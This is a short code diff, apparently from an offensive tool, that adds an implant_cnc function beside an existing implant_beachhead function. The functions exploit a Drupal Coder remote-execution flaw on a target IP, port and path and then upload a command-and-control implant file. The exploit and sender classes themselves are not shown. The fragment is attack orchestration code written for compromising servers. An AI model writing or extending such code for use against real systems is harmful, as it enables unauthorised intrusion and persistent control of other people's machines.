@@ -17,3 +17,6 @@ def implant_beachhead(ip_addr, port, path):
     exec = DrupalCoderExec(beachhead)
     exec.exploit(ip_addr, port, path)
     
+def implant_cnc(ip_addr, port, path, implant_file_path):
+    sender = BeachheadSender(ip_addr, port, path, implant_file_path)
+    sender.send_request()
